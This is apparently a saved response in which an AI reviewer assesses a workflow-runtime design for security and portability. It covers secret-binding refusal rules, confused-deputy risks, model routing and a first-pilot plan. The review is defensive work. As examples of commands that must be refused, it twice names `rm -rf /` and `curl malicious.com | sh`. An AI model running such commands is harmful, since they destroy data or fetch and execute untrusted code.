# T-032 Mistral Review Response

## Metadata

- **Dossier SHA-256:** `99d337126d9e0b9ca9437f1511ecd8e1504103309c6e970003605d2f69ebc9eb`
- **Model:** `mistralai/mistral-large-2512`
- **OpenRouter response ID:** `gen-1787186593-VPku70oYiuOmBiEnAErJ`
- **Finish reason:** `stop`
- **Usage:** 16,015 prompt + 1,994 completion = 18,009 tokens
- **Cost:** USD 0.0109985
- **Capture:** complete, raw response below

---

REVIEW VERSION: 99d337126d9e0b9ca9437f1511ecd8e1504103309c6e970003605d2f69ebc9eb
REVIEWER: Mistral-large (via OpenRouter)
LENS: Security and portability review

## Verdict
promising-but-incomplete — The architecture establishes strong security boundaries and portability principles, but critical gaps in secret handling, provider divergence, and refusal semantics could undermine isolation or enable privilege escalation in the first pilot.

## Findings
1. **blocker — Secret-binding resolution lacks concrete refusal rules**
   - Dossier section: 6.5 (Secrets and external access)
   - Observation: The dossier states opaque secret-binding references are resolved at execution, but does not specify refusal rules for missing, revoked, or mismatched bindings. The grounding packet confirms secrets are never exposed to workflow definitions or logs, yet the runtime’s refusal behavior for unresolved bindings is undefined.
   - Why it matters: Without explicit refusal rules, a provider adapter might silently substitute a default credential, fall back to ambient permissions, or deadlock an instance. This violates the "no silent substitution" principle and could enable privilege escalation or data exfiltration.
   - Proposed disposition: Define refusal rules for secret-binding resolution (e.g., "refuse if binding is missing, revoked, or mismatched with capability profile") and require adapter-specific refusal evidence in the attempt record. Test refusal scenarios in the first pilot.
   - Confidence: high

2. **important — Provider-adapter divergence not bounded by refusal semantics**
   - Dossier section: 6.4 (Execution profiles and capability profiles)
   - Observation: The dossier acknowledges provider adapters mediate capabilities but does not require adapters to declare refusal semantics for unsupported actions. For example, a "repository.write_test.v1" capability might be supported by one provider but refused by another, yet the runtime lacks a mechanism to enforce consistent refusal behavior.
   - Why it matters: Inconsistent refusal semantics could lead to policy drift, where a procedure ratified for one provider fails or behaves differently on another. This undermines portability and could create hidden dependencies on provider-specific quirks.
   - Proposed disposition: Require provider adapters to declare refusal rules for unsupported capabilities (e.g., "refuse if capability X is not supported") and validate these rules during ratification. Include refusal evidence in the attempt record.
   - Confidence: high

3. **important — Opaque secret-binding references could enable confused deputy attacks**
   - Dossier section: 6.5 (Secrets and external access)
   - Observation: Secret-binding references are opaque handles resolved by adapters, but the dossier does not specify how the runtime validates that a resolved secret is scoped to the declared capability profile. For example, a binding named "repo_token" might resolve to a credential with broader permissions than "repository.write_test.v1".
   - Why it matters: Without validation, an adapter could resolve a binding to a credential that exceeds the declared capability profile, enabling a confused deputy attack where a workflow instance accesses unintended resources.
   - Proposed disposition: Require the runtime to validate that resolved secrets are scoped to the declared capability profile before execution. Refuse execution if validation fails and record the refusal in the attempt record.
   - Confidence: medium

4. **improvement — Model routing lacks refusal semantics for capability mismatches**
   - Dossier section: 6.6.2 (Executor and model preference)
   - Observation: The dossier allows workflow authors to declare model preferences (e.g., "strong-reasoning"), but does not specify refusal rules for cases where no eligible model satisfies the preference. The runtime might silently substitute a weaker model or deadlock the instance.
   - Why it matters: Silent substitution could lead to degraded performance, incorrect outcomes, or security vulnerabilities (e.g., a weaker model might misinterpret a prompt and execute unintended actions).
   - Proposed disposition: Define refusal rules for model routing (e.g., "refuse if no eligible model satisfies the preference") and require explicit human reroute or fallback to a declared alternative. Test refusal scenarios in the pilot.
   - Confidence: high

5. **improvement — Command/script action boundaries lack concrete refusal tests**
   - Dossier section: 6.2.1 (Script and CLI invocation)
   - Observation: The dossier states that commands must be allowlisted, typed, and project-scoped, but does not specify refusal tests for edge cases like path traversal, shell injection, or environment variable poisoning. The grounding packet confirms raw shell text is not a v1 action type, yet the runtime’s refusal behavior for malformed commands is undefined.
   - Why it matters: Without concrete refusal tests, a malformed command could bypass the runner’s boundary checks and execute unintended actions (e.g., `rm -rf /` or `curl malicious.com | sh`).
   - Proposed disposition: Define refusal tests for command/script actions (e.g., "refuse if path contains `..`, shell metacharacters, or undeclared environment variables") and validate these tests in the first pilot.
   - Confidence: high

## Shared whole-system answers
1. Contract coherence: The contract boundary is coherent with current-state constraints for isolation and refusal semantics, but gaps in secret-binding resolution, provider-adapter divergence, and model routing could undermine safety. The dossier correctly distinguishes observed AEF capabilities from proposed design, but some proposed refusal rules are missing or ambiguous.
2. Missing safety primitive/scenario: Secret-binding resolution refusal rules and provider-adapter refusal semantics are missing primitives that could invalidate the first pilot by enabling privilege escalation or policy drift.
3. Failure for operator, agent, or maintainer: Under adversarial conditions, unresolved secret bindings, inconsistent provider refusals, or model mismatches could lead to privilege escalation, data exfiltration, or hidden dependencies on provider-specific quirks. Normal error conditions (e.g., missing bindings) could deadlock instances or require manual intervention.
4. Smallest safe pilot and disqualifying evidence: The smallest credible pilot is a single-project, single-provider workflow with one human gate, one registered script, and typed I/O. Disqualifying evidence includes:
   - A secret-binding resolution that silently substitutes a default credential or falls back to ambient permissions.
   - A provider adapter that refuses a ratified capability without recording refusal evidence.
   - A model routing decision that silently substitutes a weaker model.
   - A command/script action that bypasses boundary checks (e.g., path traversal or shell injection).
5. Inference versus supplied evidence: The dossier does not explicitly define refusal rules for secret-binding resolution, provider-adapter divergence, or model routing. These are inferences based on the stated principles (e.g., "no silent substitution"), but the dossier does not supply concrete refusal semantics.

## Missing primitives or acceptance scenarios
- Secret-binding resolution refusal rules (e.g., "refuse if binding is missing, revoked, or mismatched with capability profile").
- Provider-adapter refusal semantics for unsupported capabilities (e.g., "refuse if capability X is not supported").
- Validation of resolved secrets against declared capability profiles.
- Refusal tests for command/script actions (e.g., path traversal, shell injection).
- Model routing refusal rules (e.g., "refuse if no eligible model satisfies the preference").

## Smallest credible first pilot
**Pilot:** Single-project workflow with one human gate, one registered script (e.g., `project.verified_test_suite`), and typed I/O.
**Guardrails:**
- Runner enforces out-of-agent-identity isolation and authenticated interface.
- Secret-binding resolution refuses missing, revoked, or mismatched bindings.
- Provider adapter refuses unsupported capabilities and records refusal evidence.
- Model routing refuses if no eligible model satisfies the preference.
- Command/script actions refuse path traversal, shell injection, and undeclared environment variables.
**Disqualifying evidence:**
- Secret-binding resolution silently substitutes a default credential or falls back to ambient permissions.
- Provider adapter refuses a ratified capability without recording refusal evidence.
- Model routing silently substitutes a weaker model.
- Command/script action bypasses boundary checks (e.g., `rm -rf /` or `curl malicious.com | sh`).

## Human decisions required
- **Secret-binding resolution refusal rules:** Define refusal rules for missing, revoked, or mismatched bindings. Options: refuse execution, route to human gate, or fallback to a declared alternative. Trade-off: refusal may deadlock instances, while fallback may enable privilege escalation.
- **Provider-adapter refusal semantics:** Require adapters to declare refusal rules for unsupported capabilities. Options: refuse execution, route to human gate, or fallback to a declared alternative. Trade-off: refusal may break portability, while fallback may create hidden dependencies.
- **Model routing refusal rules:** Define refusal rules for model mismatches. Options: refuse execution, route to human gate, or fallback to a declared alternative. Trade-off: refusal may limit automation, while fallback may degrade performance or security.

## What would change this review
- Evidence of concrete refusal rules for secret-binding resolution, provider-adapter divergence, and model routing.
- Validation of resolved secrets against declared capability profiles.
- Refusal tests for command/script actions (e.g., path traversal, shell injection).
- Adversarial testing of secret-binding resolution, provider-adapter divergence, and model routing in the first pilot.
